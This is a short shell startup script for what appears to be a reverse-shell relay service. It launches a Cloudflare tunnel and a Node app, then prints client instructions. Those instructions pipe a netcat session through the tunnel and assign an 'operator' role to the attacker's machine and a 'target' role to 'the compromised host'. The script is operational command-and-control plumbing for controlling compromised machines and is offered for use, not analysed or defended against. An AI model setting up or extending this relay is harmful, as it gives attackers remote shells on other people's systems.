#!/bin/sh
set -euo pipefail

if [ -n "${REVSHELL_TUNNEL_TOKEN:-}" ]; then
  cloudflared tunnel --no-autoupdate run --token "${REVSHELL_TUNNEL_TOKEN}" &
  TUNNEL_PID=$!
  trap 'kill ${TUNNEL_PID} >/dev/null 2>&1 || true' EXIT
else
  echo "[revshell] REVSHELL_TUNNEL_TOKEN not set; skipping cloudflared tunnel startup" >&2
fi

ACCESS_HOST="${REVSHELL_ACCESS_HOSTNAME:-}"
ACCESS_PORT="${REVSHELL_PUBLIC_PORT:-443}"
if [ -z "$ACCESS_HOST" ] && [ -n "${DOMAIN:-}" ]; then
  ACCESS_HOST="revshell.${DOMAIN}"
fi

if [ -n "$ACCESS_HOST" ]; then
  cat <<EOF
[revshell] To reach this relay through Cloudflare Access, run on each client:

  cloudflared access tcp --hostname ${ACCESS_HOST}:${ACCESS_PORT} --listener localhost:9210
  # then in another shell, once /revshell create gives you a key:
  (printf 'AUTH <session-key> <operator|target>\n'; cat) | nc localhost 9210

Replace <session-key> with the value from "/revshell create" and set the role
to "operator" on your machine and "target" on the compromised host.
EOF
fi

npm start
